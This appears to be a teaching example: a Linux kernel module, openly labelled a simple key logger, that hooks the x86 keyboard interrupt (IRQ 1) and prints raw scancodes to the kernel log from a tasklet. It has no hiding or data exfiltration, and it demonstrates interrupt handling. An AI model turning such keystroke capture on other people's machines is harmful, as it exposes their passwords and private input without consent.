/*
 * keylog/keylog.c
 *
 * Brief Description:
 * On most/may x86 systems, the i8042 chip is the keyboard/mouse controller
 * and uses IRQ line #1. We hook into it and print the keyboard scancode and
 * status code.
 *
 * (c) Kaiwan NB
 */
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/interrupt.h>
#include <linux/atomic.h>
#include "../../convenient.h"

#define OURMODNAME   "keylog"

MODULE_AUTHOR("Kaiwan NB");
MODULE_DESCRIPTION("a simple key logger; meant for x86 where IRQ 1 used for kbd/mouse");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

/*------------------------------------------------------------*/
/* Directly from the original i8042 driver */
#define I8042_KBD_IRQ          1
#define I8042_COMMAND_REG   0x64
#define I8042_STATUS_REG    0x64
#define I8042_DATA_REG      0x60

#if 0
/* Status register bits.  */
#define I8042_STR_PARITY    0x80
#define I8042_STR_TIMEOUT   0x40
#define I8042_STR_AUXDATA   0x20
#define I8042_STR_KEYLOCK   0x10
#define I8042_STR_CMDDAT    0x08
#define I8042_STR_MUXERR    0x04
#define I8042_STR_IBF       0x02
#define I8042_STR_OBF       0x01
#endif
/*------------------------------------------------------------*/

static struct tasklet_struct *ts;
static atomic64_t c = ATOMIC64_INIT(0);

static void keylog_tasklet(unsigned long data)
{
#if 0
	if (!(c++ % 10))
		QPDS;
#endif
	atomic64_inc(&c);
	pr_info("%6lu:0x%x,0x%x/0x%x\n",
		atomic64_read(&c), inb(I8042_DATA_REG), inb(I8042_STATUS_REG), inb(0x61));
}

static irqreturn_t keylog_intr(int irq, void *data)
{
	//u8 stat;
	int ret = 0;

#if 0
	stat = inb(I8042_STATUS_REG);
    if (unlikely(~stat & I8042_STR_OBF)) {
		pr_info("%s: interrupt without data\n", OURMODNAME);
		ret = 1;
		goto out;
	}
#endif
	tasklet_schedule(ts);

out:
	return IRQ_RETVAL(ret);
}

static int __init keylog_init(void)
{
	int ret = 0;

#ifndef CONFIG_X86
	pr_info("%s: this driver only works for the x86\n", OURMODNAME);
	return -EINVAL;
#endif

	ret = request_irq(I8042_KBD_IRQ, keylog_intr, IRQF_SHARED, OURMODNAME, THIS_MODULE);
	if (ret < 0) {
		pr_warn("%s: couldn't get irq #1\n", OURMODNAME);
		goto out;
	}

	ts = kzalloc(sizeof(struct tasklet_struct), GFP_KERNEL);
	if (!ts) {
		ret = -ENOMEM;
		free_irq(1, THIS_MODULE);
		goto out;
	}
		
	tasklet_init(ts, keylog_tasklet, 0L);
	pr_info("%s: got irq %d and registered tasklet\n", OURMODNAME, I8042_KBD_IRQ);

out:
	return ret;
}

static void __exit keylog_exit(void)
{
	free_irq(1, THIS_MODULE);
	kfree(ts);
	pr_debug("%s: removed (%lu keystrokes logged)\n", OURMODNAME, atomic64_read(&c));
}

module_init(keylog_init);
module_exit(keylog_exit);
